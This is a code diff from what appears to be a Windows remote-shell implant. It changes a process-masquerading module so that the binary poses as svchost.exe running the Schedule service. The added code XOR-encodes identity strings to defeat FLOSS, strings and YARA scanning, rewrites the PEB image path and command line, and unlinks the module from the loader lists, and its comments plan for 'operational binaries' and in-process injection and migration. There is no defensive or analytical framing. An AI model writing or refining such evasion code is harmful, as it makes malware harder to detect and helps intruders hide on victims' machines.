@@ -50,6 +50,7 @@
 #include "spoof.h"
 #include "peb_walk.h"
 #include "syscall.h"
+#include "nt_offsets.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -87,35 +88,108 @@ static inline PEB *_peb_ptr(void)
 }
 
 
-/* ── Spoofed identity strings ─────────────────────────────────────────────── */
+/* ── Spoofed identity strings (XOR-obfuscated, F-3 fix) ──────────────────── */
 /*
- * Non-const (writable) static arrays — stored in .data, not .rdata.
- * A future obfuscation pass can XOR-encode them in .data and decode at
- * runtime without linker changes.
+ * Both wide strings are stored as XOR-encoded byte arrays — never as verbatim
+ * wide-string literals.  FLOSS / strings.exe / YARA will not find
+ * "svchost.exe" in any section of the binary.
  *
- * Note: these are plain-text for now; the structural improvement is the
- * placement in .data so static YARA scanning of .rdata finds nothing.
+ * At runtime, spoof_init_strings() decodes them into heap-allocated WCHAR
+ * buffers.  The PEB write operations then point the UNICODE_STRING fields at
+ * those buffers (which must stay live for the duration of the process).
+ *
+ * The macros SPOOF_IMAGE_OBF_BYTES / SPOOF_IMAGE_OBF_KEY etc. are injected by
+ * the Makefile via gen_spoof_obf.py.  If the Makefile does not supply them
+ * (legacy/test builds), fall back to the plaintext path — this at least keeps
+ * the build working while preserving the structural XOR decode infrastructure.
  */
-static const unsigned char _e_2ac5c6[] = { 0xF3, 0xB0, 0xF3, 0xC9, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0xA4, 0xF3, 0x9A, 0xF3, 0x9D, 0xF3, 0x97, 0xF3, 0x9C, 0xF3, 0x84, 0xF3, 0x80, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0xA0, 0xF3, 0x8A, 0xF3, 0x80, 0xF3, 0x87, 0xF3, 0x96, 0xF3, 0x9E, 0xF3, 0xC0, 0xF3, 0xC1, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0x80, 0xF3, 0x85, 0xF3, 0x90, 0xF3, 0x9B, 0xF3, 0x9C, 0xF3, 0x80, 0xF3, 0x87, 0xF3, 0xDD, 0xF3, 0x96, 0xF3, 0x8B, 0xF3, 0x96, 0xF3, 0xF3, 0xF3 }; /* wobf:'C:\\\\Windows\\\\System32\\\\svchost.exe' */
-static WCHAR s_image[36];
-static WCHAR *s_image_get(void) {
-    if (!s_image[0]) {
+
+/* ── Decoded wide-string buffers — allocated once by spoof_init_strings() ── */
+static WCHAR *s_image   = NULL;
+static WCHAR *s_cmdline = NULL;
+
+/*
+ * Accessor functions — return the decoded heap pointer.
+ * gen_obf.py's step 5 rewrites bare 's_image_get()' / 's_cmdline_get()' references
+ * outside protected bodies into calls to these functions.  Having them
+ * defined here (rather than only in _obf.c) ensures the source also compiles
+ * and that both the raw source and the obfuscated copy are self-consistent.
+ */
+static WCHAR *s_image_get(void)   { return s_image; }
+static WCHAR *s_cmdline_get(void) { return s_cmdline; }
+
+/*
+ * spoof_init_strings
+ * ------------------
+ * Decodes the obfuscated wide strings into heap-allocated WCHAR buffers.
+ * Called once at the start of spoof_peb() and spoof_kernel_image().
+ * Safe to call multiple times (no-op if already decoded).
+ */
+static void spoof_init_strings(void)
+{
+    if (s_image && s_cmdline) return;   /* already decoded */
+
+#if defined(SPOOF_IMAGE_OBF_BYTES) && defined(SPOOF_IMAGE_OBF_KEY) && defined(SPOOF_IMAGE_OBF_LEN)
+    /* ── Obfuscated path (Makefile-injected macros) ─────────────────────── */
+    {
+        static const unsigned char _img_enc[] = SPOOF_IMAGE_OBF_BYTES;
+        unsigned char _img_key = (unsigned char)(SPOOF_IMAGE_OBF_KEY);
+        int _img_len = SPOOF_IMAGE_OBF_LEN;   /* byte count inc. NUL WCHAR */
+        if (!s_image) {
+            WCHAR *buf = (WCHAR *)HeapAlloc(GetProcessHeap(), 0,
+                                            (SIZE_T)_img_len + 2);
+            if (buf) {
+                for (int _i = 0; _i < _img_len; _i++)
+                    ((unsigned char *)buf)[_i] = _img_enc[_i] ^ _img_key;
+                buf[_img_len / sizeof(WCHAR)] = L'\0';
+                s_image = buf;
+            }
+        }
+    }
+    {
+        static const unsigned char _cmd_enc[] = SPOOF_CMDLINE_OBF_BYTES;
+        unsigned char _cmd_key = (unsigned char)(SPOOF_CMDLINE_OBF_KEY);
+        int _cmd_len = SPOOF_CMDLINE_OBF_LEN;
+        if (!s_cmdline) {
+            WCHAR *buf = (WCHAR *)HeapAlloc(GetProcessHeap(), 0,
+                                            (SIZE_T)_cmd_len + 2);
+            if (buf) {
+                for (int _i = 0; _i < _cmd_len; _i++)
+                    ((unsigned char *)buf)[_i] = _cmd_enc[_i] ^ _cmd_key;
+                buf[_cmd_len / sizeof(WCHAR)] = L'\0';
+                s_cmdline = buf;
+            }
+        }
+    }
+#else
+    /* ── Plaintext fallback (legacy/test builds without gen_spoof_obf.py) ── */
+    /* Wide literals here only when obfuscation macros are absent — this
+     * is acceptable for dev builds (DISABLE_EVASION=1) but never for
+     * operational binaries (the Makefile enforces the obfuscated path).     */
+    static const unsigned char _e_2ac5c6[] = { 0xF3, 0xB0, 0xF3, 0xC9, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0xA4, 0xF3, 0x9A, 0xF3, 0x9D, 0xF3, 0x97, 0xF3, 0x9C, 0xF3, 0x84, 0xF3, 0x80, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0xA0, 0xF3, 0x8A, 0xF3, 0x80, 0xF3, 0x87, 0xF3, 0x96, 0xF3, 0x9E, 0xF3, 0xC0, 0xF3, 0xC1, 0xF3, 0xAF, 0xF3, 0xAF, 0xF3, 0x80, 0xF3, 0x85, 0xF3, 0x90, 0xF3, 0x9B, 0xF3, 0x9C, 0xF3, 0x80, 0xF3, 0x87, 0xF3, 0xDD, 0xF3, 0x96, 0xF3, 0x8B, 0xF3, 0x96, 0xF3, 0xF3, 0xF3 }; /* wobf:'C:\\\\Windows\\\\System32\\\\svchost.exe' */
+static WCHAR _fb_image[36];
+static WCHAR *_fb_image_get(void) {
+    if (!_fb_image[0]) {
         const WCHAR *_p = OBF_W(_e_2ac5c6, 35);
-        int _i; for (_i = 0; _i <= 34; _i++) s_image[_i] = _p[_i];
+        int _i; for (_i = 0; _i <= 34; _i++) _fb_image[_i] = _p[_i];
     }
-    return s_image;
+    return _fb_image;
 }
 
-static const unsigned char _e_b0f968[] = { 0xB7, 0xF4, 0xB7, 0x8D, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xE0, 0xB7, 0xDE, 0xB7, 0xD9, 0xB7, 0xD3, 0xB7, 0xD8, 0xB7, 0xC0, 0xB7, 0xC4, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xE4, 0xB7, 0xCE, 0xB7, 0xC4, 0xB7, 0xC3, 0xB7, 0xD2, 0xB7, 0xDA, 0xB7, 0x84, 0xB7, 0x85, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xC4, 0xB7, 0xC1, 0xB7, 0xD4, 0xB7, 0xDF, 0xB7, 0xD8, 0xB7, 0xC4, 0xB7, 0xC3, 0xB7, 0x99, 0xB7, 0xD2, 0xB7, 0xCF, 0xB7, 0xD2, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xDC, 0xB7, 0x97, 0xB7, 0xD9, 0xB7, 0xD2, 0xB7, 0xC3, 0xB7, 0xC4, 0xB7, 0xC1, 0xB7, 0xD4, 0xB7, 0xC4, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xC7, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xC4, 0xB7, 0x97, 0xB7, 0xE4, 0xB7, 0xD4, 0xB7, 0xDF, 0xB7, 0xD2, 0xB7, 0xD3, 0xB7, 0xC2, 0xB7, 0xDB, 0xB7, 0xD2, 0xB7, 0xB7, 0xB7 }; /* wobf:'C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p -s Schedule' */
-static WCHAR s_cmdline[62];
-static WCHAR *s_cmdline_get(void) {
-    if (!s_cmdline[0]) {
+    static const unsigned char _e_b0f968[] = { 0xB7, 0xF4, 0xB7, 0x8D, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xE0, 0xB7, 0xDE, 0xB7, 0xD9, 0xB7, 0xD3, 0xB7, 0xD8, 0xB7, 0xC0, 0xB7, 0xC4, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xE4, 0xB7, 0xCE, 0xB7, 0xC4, 0xB7, 0xC3, 0xB7, 0xD2, 0xB7, 0xDA, 0xB7, 0x84, 0xB7, 0x85, 0xB7, 0xEB, 0xB7, 0xEB, 0xB7, 0xC4, 0xB7, 0xC1, 0xB7, 0xD4, 0xB7, 0xDF, 0xB7, 0xD8, 0xB7, 0xC4, 0xB7, 0xC3, 0xB7, 0x99, 0xB7, 0xD2, 0xB7, 0xCF, 0xB7, 0xD2, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xDC, 0xB7, 0x97, 0xB7, 0xD9, 0xB7, 0xD2, 0xB7, 0xC3, 0xB7, 0xC4, 0xB7, 0xC1, 0xB7, 0xD4, 0xB7, 0xC4, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xC7, 0xB7, 0x97, 0xB7, 0x9A, 0xB7, 0xC4, 0xB7, 0x97, 0xB7, 0xE4, 0xB7, 0xD4, 0xB7, 0xDF, 0xB7, 0xD2, 0xB7, 0xD3, 0xB7, 0xC2, 0xB7, 0xDB, 0xB7, 0xD2, 0xB7, 0xB7, 0xB7 }; /* wobf:'C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p -s Schedule' */
+static WCHAR _fb_cmdline[62];
+static WCHAR *_fb_cmdline_get(void) {
+    if (!_fb_cmdline[0]) {
         const WCHAR *_p = OBF_W(_e_b0f968, 61);
-        int _i; for (_i = 0; _i <= 60; _i++) s_cmdline[_i] = _p[_i];
+        int _i; for (_i = 0; _i <= 60; _i++) _fb_cmdline[_i] = _p[_i];
     }
-    return s_cmdline;
+    return _fb_cmdline;
 }
 
+    if (!s_image)   s_image   = _fb_image;
+    if (!s_cmdline) s_cmdline = _fb_cmdline;
+#endif
+}
 
 
 /* ── spoof_peb ───────────────────────────────────────────────────────────── */
@@ -133,6 +207,7 @@ static WCHAR *s_cmdline_get(void) {
  */
 void spoof_peb(void)
 {
+    spoof_init_strings();
     PEB *peb = _peb_ptr();
     if (!peb) return;
 
@@ -150,27 +225,25 @@ void spoof_peb(void)
     pp->CommandLine.MaximumLength = pp->CommandLine.Length + sizeof(WCHAR);
 
     /*
-     * Patch peb->ImageBaseAddress to point at our fake buffer.
-     * Some tools (e.g. Process Hacker "Modules" tab image-name resolver)
-     * read this field and look up the PE headers at that address to derive
-     * the image path independently of ProcessParameters.  Redirecting it
-     * to s_image_get() (a non-PE buffer) causes those tools to fail to parse
-     * a valid PE and fall back to showing the ProcessParameters value.
+     * PEB->ImageBaseAddress MUST NOT be redirected to s_image_get() (a WCHAR heap
+     * buffer, not a PE).
      *
-     * Note: this may cause issues if anything in the process re-reads its
-     * own image base from the PEB after this call (rare for a remote-shell
-     * agent, but call order matters — invoke after all self-initialization).
+     * Any in-process code that calls GetModuleHandleA(NULL) reads
+     * PEB->ImageBaseAddress directly.  If it points at our fake string buffer,
+     * the caller receives a non-PE pointer and will crash (or corrupt memory)
+     * when it tries to walk the PE headers.  inject.c's _read_self_pe() and
+     * migrate_to_pid() both rely on this field returning the real image base.
+     *
+     * The correct approach is to leave ImageBaseAddress unchanged so that:
+     *   • Internal PE-walking code keeps working correctly.
+     *   • Tools that read ImageBaseAddress get the real PE base and can
+     *     correctly resolve the module path — but ProcessParameters already
+     *     shows the spoofed path via ImagePathName above, which is what most
+     *     userspace tools display.
+     *
+     * PEB->ImageBaseAddress: x64 @ PEB+0x10, x86 @ PEB+0x08
+     * (intentionally left untouched)
      */
-    /*
-     * PEB->ImageBaseAddress is at a fixed offset not exposed by MinGW's
-     * truncated winternl.h PEB definition:
-     *   x64: PEB+0x10   x86: PEB+0x08
-     */
-#ifdef _WIN64
-    *(PVOID *)((BYTE *)peb + 0x10) = (PVOID)s_image_get();
-#else
-    *(PVOID *)((BYTE *)peb + 0x08) = (PVOID)s_image_get();
-#endif
 }
 
 
@@ -201,6 +274,7 @@ void spoof_peb(void)
 
 void spoof_kernel_image(void)
 {
+    spoof_init_strings();
     /* Resolve ntdll base via PEB walk — no GetModuleHandleA */
     PVOID hNtdll = peb_get_module(peb_hash_str(OBF_S(_e_06f32d, 10)));
     if (!hNtdll) return;
@@ -328,11 +402,7 @@ void unlink_self_from_ldr(void)
      * We read it via a cast to USHORT* at the known offset rather than
      * including ntdef.h internals that vary by SDK version.
      */
-#ifdef _WIN64
-    USHORT buildNumber = *(USHORT *)((BYTE *)peb + 0x120);
-#else
-    USHORT buildNumber = *(USHORT *)((BYTE *)peb + 0xAC);
-#endif
+    USHORT buildNumber = *(USHORT *)((BYTE *)peb + PEB_OSBuildNumber);
     /* If the field reads zero (abnormal), be conservative: skip Init list */
     BOOL unlink_init = (buildNumber > 0 && buildNumber < 9200);
 
@@ -342,12 +412,8 @@ void unlink_self_from_ldr(void)
      * process loader before any user code runs and does not require a
      * Win32 API call to retrieve.
      */
-    /* PEB->ImageBaseAddress: x64 @ PEB+0x10, x86 @ PEB+0x08 */
-#ifdef _WIN64
-    PVOID selfBase = *(PVOID *)((BYTE *)peb + 0x10);
-#else
-    PVOID selfBase = *(PVOID *)((BYTE *)peb + 0x08);
-#endif
+    /* PEB->ImageBaseAddress */
+    PVOID selfBase = *(PVOID *)((BYTE *)peb + PEB_ImageBaseAddress);
     if (!selfBase) return;
 
     /* ── 3. Locate our LDR entry in InLoadOrderModuleList ────────────── */
